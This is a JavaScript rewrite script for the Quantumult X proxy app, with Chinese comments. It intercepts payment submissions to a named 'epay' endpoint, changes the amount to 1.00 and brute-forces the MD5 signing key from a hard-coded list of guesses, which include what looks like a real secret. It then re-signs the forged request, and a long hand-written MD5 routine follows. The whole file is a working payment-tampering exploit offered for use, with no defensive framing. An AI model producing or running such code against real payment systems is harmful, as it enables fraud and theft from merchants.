// 文件名: change_payment.js
// 描述: 修改支付金额为1元并重新计算签名
// 使用方式: 在Quantumult X的重写规则中添加

const url = $request.url;
const body = $request.body;

// 尝试的密钥列表
const POSSIBLE_KEYS = [
    "",
    "test",
    "123456",
    "md5key",
    "epay",
    "credit",
    "linuxdo",
    "shop",
    "shopsxxe",
    "sxxe.net",
    "7d393c101aec6fbdd688b724ec576f46d03a653905221a8fdf3005e5169a5114",
    "7d393c101aec6fbdd688b724ec576f46",
    "d03a653905221a8fdf3005e5169a5114"
];

// 检查是否是目标请求
if (url.indexOf('credit.linux.do/epay/pay/submit.php') !== -1) {
    try {
        // 解析参数
        const params = {};
        body.split('&').forEach(pair => {
            const [key, value] = pair.split('=');
            params[key] = decodeURIComponent(value || '');
        });
        
        // 保存原始签名
        const originalSign = params.sign;
        
        // 找出正确密钥的函数
        function findCorrectKey(params, originalSign) {
            for (let key of POSSIBLE_KEYS) {
                // 生成排序后的参数字符串（排除sign和sign_type）
                const sortedKeys = Object.keys(params)
                    .filter(k => k !== 'sign' && k !== 'sign_type' && params[k] !== '')
                    .sort();
                
                const sortedParams = sortedKeys
                    .map(k => `${k}=${params[k]}`)
                    .join('&');
                
                // 计算MD5
                const testSign = md5(sortedParams + key);
                
                if (testSign === originalSign) {
                    console.log(`✅ 找到正确密钥: "${key}"`);
                    return key;
                }
            }
            console.log("❌ 未找到正确密钥");
            return POSSIBLE_KEYS[0];
        }
        
        // 修改金额为1.00
        console.log(`原金额: ${params.money}`);
        params.money = '1.00';
        console.log(`新金额: ${params.money}`);
        
        // 找到正确密钥
        const correctKey = findCorrectKey({...params}, originalSign);
        
        // 重新计算签名
        const sortedKeys = Object.keys(params)
            .filter(k => k !== 'sign' && k !== 'sign_type' && params[k] !== '')
            .sort();
        
        const sortedParams = sortedKeys
            .map(k => `${k}=${params[k]}`)
            .join('&');
        
        params.sign = md5(sortedParams + correctKey);
        console.log(`新签名: ${params.sign}`);
        
        // 重建请求体
        const newBody = Object.keys(params)
            .map(key => `${key}=${encodeURIComponent(params[key])}`)
            .join('&');
        
        console.log("修改完成，正在发送请求...");
        
        // 完成修改，继续发送请求
        $done({body: newBody});
        
    } catch (error) {
        console.log(`处理请求时出错: ${error}`);
        $done({});
    }
} else {
    $done({});
}

// MD5函数 - Quantumult X兼容版本
function md5(str) {
    // Quantumult X内置了$crypto模块
    return $crypto.MD5(str);
}

// 或者如果你的Quantumult X版本较老，可以使用这个兼容版本
function md5Fallback(str) {
    // 这是一个简单的MD5实现，但建议使用$crypto.MD5
    const hexcase = 0;
    const chrsz = 8;
    
    function hex_md5(s) {
        return binl2hex(core_md5(str2binl(s), s.length * chrsz));
    }
    
    function core_md5(x, len) {
        x[len >> 5] |= 0x80 << ((len) % 32);
        x[(((len + 64) >>> 9) << 4) + 14] = len;
        
        let a = 1732584193;
        let b = -271733879;
        let c = -1732584194;
        let d = 271733878;
        
        for (let i = 0; i < x.length; i += 16) {
            const olda = a;
            const oldb = b;
            const oldc = c;
            const oldd = d;
            
            a = md5_ff(a, b, c, d, x[i], 7, -680876936);
            d = md5_ff(d, a, b, c, x[i + 1], 12, -389564586);
            c = md5_ff(c, d, a, b, x[i + 2], 17, 606105819);
            b = md5_ff(b, c, d, a, x[i + 3], 22, -1044525330);
            a = md5_ff(a, b, c, d, x[i + 4], 7, -176418897);
            d = md5_ff(d, a, b, c, x[i + 5], 12, 1200080426);
            c = md5_ff(c, d, a, b, x[i + 6], 17, -1473231341);
            b = md5_ff(b, c, d, a, x[i + 7], 22, -45705983);
            a = md5_ff(a, b, c, d, x[i + 8], 7, 1770035416);
            d = md5_ff(d, a, b, c, x[i + 9], 12, -1958414417);
            c = md5_ff(c, d, a, b, x[i + 10], 17, -42063);
            b = md5_ff(b, c, d, a, x[i + 11], 22, -1990404162);
            a = md5_ff(a, b, c, d, x[i + 12], 7, 1804603682);
            d = md5_ff(d, a, b, c, x[i + 13], 12, -40341101);
            c = md5_ff(c, d, a, b, x[i + 14], 17, -1502002290);
            b = md5_ff(b, c, d, a, x[i + 15], 22, 1236535329);
            
            a = md5_gg(a, b, c, d, x[i + 1], 5, -165796510);
            d = md5_gg(d, a, b, c, x[i + 6], 9, -1069501632);
            c = md5_gg(c, d, a, b, x[i + 11], 14, 643717713);
            b = md5_gg(b, c, d, a, x[i], 20, -373897302);
            a = md5_gg(a, b, c, d, x[i + 5], 5, -701558691);
            d = md5_gg(d, a, b, c, x[i + 10], 9, 38016083);
            c = md5_gg(c, d, a, b, x[i + 15], 14, -660478335);
            b = md5_gg(b, c, d, a, x[i + 4], 20, -405537848);
            a = md5_gg(a, b, c, d, x[i + 9], 5, 568446438);
            d = md5_gg(d, a, b, c, x[i + 14], 9, -1019803690);
            c = md5_gg(c, d, a, b, x[i + 3], 14, -187363961);
            b = md5_gg(b, c, d, a, x[i + 8], 20, 1163531501);
            a = md5_gg(a, b, c, d, x[i + 13], 5, -1444681467);
            d = md5_gg(d, a, b, c, x[i + 2], 9, -51403784);
            c = md5_gg(c, d, a, b, x[i + 7], 14, 1735328473);
            b = md5_gg(b, c, d, a, x[i + 12], 20, -1926607734);
            
            a = md5_hh(a, b, c, d, x[i + 5], 4, -378558);
            d = md5_hh(d, a, b, c, x[i + 8], 11, -2022574463);
            c = md5_hh(c, d, a, b, x[i + 11], 16, 1839030562);
            b = md5_hh(b, c, d, a, x[i + 14], 23, -35309556);
            a = md5_hh(a, b, c, d, x[i + 1], 4, -1530992060);
            d = md5_hh(d, a, b, c, x[i + 4], 11, 1272893353);
            c = md5_hh(c, d, a, b, x[i + 7], 16, -155497632);
            b = md5_hh(b, c, d, a, x[i + 10], 23, -1094730640);
            a = md5_hh(a, b, c, d, x[i + 13], 4, 681279174);
            d = md5_hh(d, a, b, c, x[i], 11, -358537222);
            c = md5_hh(c, d, a, b, x[i + 3], 16, -722521979);
            b = md5_hh(b, c, d, a, x[i + 6], 23, 76029189);
            a = md5_hh(a, b, c, d, x[i + 9], 4, -640364487);
            d = md5_hh(d, a, b, c, x[i + 12], 11, -421815835);
            c = md5_hh(c, d, a, b, x[i + 15], 16, 530742520);
            b = md5_hh(b, c, d, a, x[i + 2], 23, -995338651);
            
            a = md5_ii(a, b, c, d, x[i], 6, -198630844);
            d = md5_ii(d, a, b, c, x[i + 7], 10, 1126891415);
            c = md5_ii(c, d, a, b, x[i + 14], 15, -1416354905);
            b = md5_ii(b, c, d, a, x[i + 5], 21, -57434055);
            a = md5_ii(a, b, c, d, x[i + 12], 6, 1700485571);
            d = md5_ii(d, a, b, c, x[i + 3], 10, -1894986606);
            c = md5_ii(c, d, a, b, x[i + 10], 15, -1051523);
            b = md5_ii(b, c, d, a, x[i + 1], 21, -2054922799);
            a = md5_ii(a, b, c, d, x[i + 8], 6, 1873313359);
            d = md5_ii(d, a, b, c, x[i + 15], 10, -30611744);
            c = md5_ii(c, d, a, b, x[i + 6], 15, -1560198380);
            b = md5_ii(b, c, d, a, x[i + 13], 21, 1309151649);
            a = md5_ii(a, b, c, d, x[i + 4], 6, -145523070);
            d = md5_ii(d, a, b, c, x[i + 11], 10, -1120210379);
            c = md5_ii(c, d, a, b, x[i + 2], 15, 718787259);
            b = md5_ii(b, c, d, a, x[i + 9], 21, -343485551);
            
            a = safe_add(a, olda);
            b = safe_add(b, oldb);
            c = safe_add(c, oldc);
            d = safe_add(d, oldd);
        }
        return Array(a, b, c, d);
    }
    
    function md5_cmn(q, a, b, x, s, t) {
        return safe_add(bit_rol(safe_add(safe_add(a, q), safe_add(x, t)), s), b);
    }
    
    function md5_ff(a, b, c, d, x, s, t) {
        return md5_cmn((b & c) | ((~b) & d), a, b, x, s, t);
    }
    
    function md5_gg(a, b, c, d, x, s, t) {
        return md5_cmn((b & d) | (c & (~d)), a, b, x, s, t);
    }
    
    function md5_hh(a, b, c, d, x, s, t) {
        return md5_cmn(b ^ c ^ d, a, b, x, s, t);
    }
    
    function md5_ii(a, b, c, d, x, s, t) {
        return md5_cmn(c ^ (b | (~d)), a, b, x, s, t);
    }
    
    function safe_add(x, y) {
        const lsw = (x & 0xFFFF) + (y & 0xFFFF);
        const msw = (x >> 16) + (y >> 16) + (lsw >> 16);
        return (msw << 16) | (lsw & 0xFFFF);
    }
    
    function bit_rol(num, cnt) {
        return (num << cnt) | (num >>> (32 - cnt));
    }
    
    function str2binl(str) {
        const bin = [];
        const mask = (1 << chrsz) - 1;
        for (let i = 0; i < str.length * chrsz; i += chrsz) {
            bin[i >> 5] |= (str.charCodeAt(i / chrsz) & mask) << (i % 32);
        }
        return bin;
    }
    
    function binl2hex(binarray) {
        const hex_tab = hexcase ? "0123456789ABCDEF" : "0123456789abcdef";
        let str = "";
        for (let i = 0; i < binarray.length * 4; i++) {
            str += hex_tab.charAt((binarray[i >> 2] >> ((i % 4) * 8 + 4)) & 0xF) +
                   hex_tab.charAt((binarray[i >> 2] >> ((i % 4) * 8)) & 0xF);
        }
        return str;
    }
    
    return hex_md5(str);
}
